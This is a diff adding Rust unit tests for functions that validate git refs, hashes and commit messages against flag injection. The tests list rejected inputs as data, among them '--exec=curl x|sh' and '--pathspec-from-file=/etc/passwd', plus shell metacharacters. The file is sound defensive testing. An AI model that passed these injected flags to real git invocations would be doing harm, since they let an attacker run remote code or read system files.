@@ -807,3 +807,78 @@ export_plugin_api! {
     docs = docs_value(),
     handle = api_handle,
 }
+
+#[cfg(test)]
+mod tests {
+    use super::{is_safe_hash, is_safe_ref, validate_commit_message};
+
+    // P0-18: `is_safe_ref` guards user-supplied refs/paths from being
+    // parsed by git as flags. Leading `-` and anything outside
+    // `[A-Za-z0-9_./-]` must be rejected.
+
+    #[test]
+    fn safe_ref_accepts_ordinary_refs_and_paths() {
+        assert!(is_safe_ref("HEAD").is_ok());
+        assert!(is_safe_ref("main").is_ok());
+        assert!(is_safe_ref("feature/foo-bar").is_ok());
+        assert!(is_safe_ref("v1.2.3").is_ok());
+        assert!(is_safe_ref("refs/heads/dev").is_ok());
+        assert!(is_safe_ref("abc123").is_ok());
+    }
+
+    #[test]
+    fn safe_ref_rejects_leading_dash() {
+        // These would be parsed by `git reset` / `git rebase` as flags
+        // rather than tree-ish arguments — the P0-18 attack surface.
+        for injection in &[
+            "-p",
+            "--exec=curl x|sh",
+            "--force",
+            "--interactive",
+            "--pathspec-from-file=/etc/passwd",
+        ] {
+            assert!(
+                is_safe_ref(injection).is_err(),
+                "leading `-` must be rejected: {injection}"
+            );
+        }
+    }
+
+    #[test]
+    fn safe_ref_rejects_shell_metacharacters() {
+        for bad in &["a;b", "a$b", "a`b", "a|b", "a b", "a\nb", "a\"b"] {
+            assert!(is_safe_ref(bad).is_err(), "should reject: {bad:?}");
+        }
+    }
+
+    #[test]
+    fn safe_ref_rejects_empty() {
+        assert!(is_safe_ref("").is_err());
+    }
+
+    // is_safe_hash is is_safe_ref + no `/`.
+    #[test]
+    fn safe_hash_accepts_hex_and_rejects_slashes() {
+        assert!(is_safe_hash("abc123").is_ok());
+        assert!(is_safe_hash("deadbeef").is_ok());
+        assert!(is_safe_hash("origin/main").is_err());
+        assert!(is_safe_hash("--exec=x").is_err());
+    }
+
+    // validate_commit_message: message body no longer has substring
+    // guard (that was the P0-18 rollback); it only rejects empties.
+    #[test]
+    fn commit_message_rejects_empty_and_whitespace() {
+        assert!(validate_commit_message("").is_err());
+        assert!(validate_commit_message("   \n\t  ").is_err());
+    }
+
+    #[test]
+    fn commit_message_accepts_legitimate_text_with_flag_words() {
+        // Post-P0-18, `--force` in message body is no longer rejected —
+        // it's just data in `-m <msg>`, not a git flag.
+        assert!(validate_commit_message("revert --force flag experiment").is_ok());
+        assert!(validate_commit_message("amend the retry logic").is_ok());
+        assert!(validate_commit_message("fix bug").is_ok());
+    }
+}
